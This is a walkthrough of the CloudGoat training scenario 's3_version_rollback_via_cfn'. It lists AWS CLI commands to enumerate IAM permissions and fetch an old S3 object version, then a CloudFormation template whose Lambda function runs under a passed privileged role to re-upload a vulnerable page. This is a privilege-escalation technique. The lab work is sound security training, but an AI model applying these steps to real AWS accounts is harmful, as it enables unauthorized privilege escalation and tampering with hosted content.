# CloudGoat Walkthrough: s3_version_rollback_via_cfn

1. Verify that the given website URL uses S3 static web hosting.

2. Configure your AWS CLI profile.

```sh
$ aws configure --profile {IAM User}
```

3. Check permissions.

```sh
$ aws sts get-caller-identity --profile {IAM User}
$ aws iam list-user-policies --user-name {} --profile {IAM User}
$ aws iam get-user-policy --user-name {} --policy-name {} --profile {IAM User}
	-> Check S3 permissions, CloudFormation:CreateStack, lambda:InvokeFunction, and passrolls to roles.
```

4. S3 object, check version and then try to download.

```sh
$ aws s3 ls s3://{} --profile {IAM User} 
		-> Verify bucket name by reporting website static address.

$ aws s3api list-object-versions \
 --bucket {} \
 --profile {IAM User}

$ aws s3api get-object \
  --bucket {} \
  --key {} \
  --version-id {}\
  ./{outfile} \
  --profile {IAM User}
```

5. Check the contents of previous version `index.html`.

```
$ cat {index.html}
    -> Reviewed the code that attempts to read flag.txt from another bucket. It is clear that the corresponding HTML needs to be restored.
    -->The flag.txt object cannot be accessed directly.
```

6. Check permissions to use Cloudformation after restore fails due to lack of putobject permission required to restore previous version. Also get information about Role that allows passrole.

```sh
$ aws iam list-roles --profile {IAM User}
  -> Check the CloudFormation, Lambda Role.

$ aws iam list-role-policies --role-name {Role name} --profile {IAM User}

$ aws iam get-role-policy --role-name {} --policy-name {} --profile {IAM User}
  -> Check the roles trust policy and permission policy.
```

7. Create a CloudFormation template (YAML) to define and deploy a Lambda function, ensuring the appropriate trust relationships (assume role) and permissions (pass role) are correctly configured for each related service.

```yaml
AWSTemplateFormatVersion: '2010-09-09'
Description: Upload index.html to S3 using Lambda (executed by CloudFormation)

Resources:
  UploadIndexFunction:
    Type: AWS::Lambda::Function
    Properties:
      FunctionName: UploadIndexFile
      Runtime: python3.12
      Handler: index.lambda_handler
      Role: arn:aws:iam::{}:role/{LambdaPutRole}
      Code:
        ZipFile: |
          import boto3

          def lambda_handler(event, context):
              s3 = boto3.client("s3")
              content = """
              {index.html Copy and paste vulnerable version code}
              """
              s3.put_object(
                  Bucket="{Index Bucket}",
                  Key="index.html",
                  Body=content,
                  ContentType="text/html"
              )
              return {"status": "uploaded"}
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -> Specify the desired function name and attach the privileged Roll  arn. Add the vulnerable version of HTML code that you previously downloaded and write the code to upload to that bucket.

8. Create CloudFormation Stack.

```sh
$ aws cloudformation create-stack \
  --stack-name {} \
  --template-body file://{yaml file path} \
  --role-arn {CF Role ARN} \
  --profile {IAM User}
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ->Since users can only create CloudFormation stacks, they create the stack by attaching the CloudFormation role using the --role-arn option. Lambda Create can only perform CloudFormation, so you must use that privilege to define the Lambda function in the template.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The Lambda function in the template is assigned a role that allows it to assume the PutObject permission. As a result, when the stack is created, a Lambda function is created to run and upload objects to the specified S3 bucket.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The Lambda function contains a vulnerable version of index.html that was previously downloaded through GetObject. Once the function is executed, this vulnerable index.html file is uploaded to the bucket. This causes the vulnerable version of the website to be re-hosted via S3 static website hosting.

9. To create a stack and run the created Lambda function, run the function with IAM Lambda Invoke permission.

```sh
$ aws lambda invoke \
	--function-name {FunctionName} \
  ./output.json --profile {IAM User}
```

10. After reconnecting to the web, restore and check the flag.

```
http://{}.s3-website-<region>.amazonaws.com/
```

## Conclusion

In this scenario, we are:
1. **Identify vulnerabilities in object lock + version combination.**.
- Object locking works on a single object, but not when combined with version management. S3 version management is the concept of stacking objects instead of overwriting them when using PutObject.
2. **AWS privilege escalation** (Create Lambda Function).
- Escalate authority by creating CloudFormation stacks.
→ Link IAM Role to Cloud information's vulnerable privileges.

This walkthrough shows cloud security vulnerabilities related to the setup of S3 and shows how to use the CloudFormation stack to generate Lambda functions.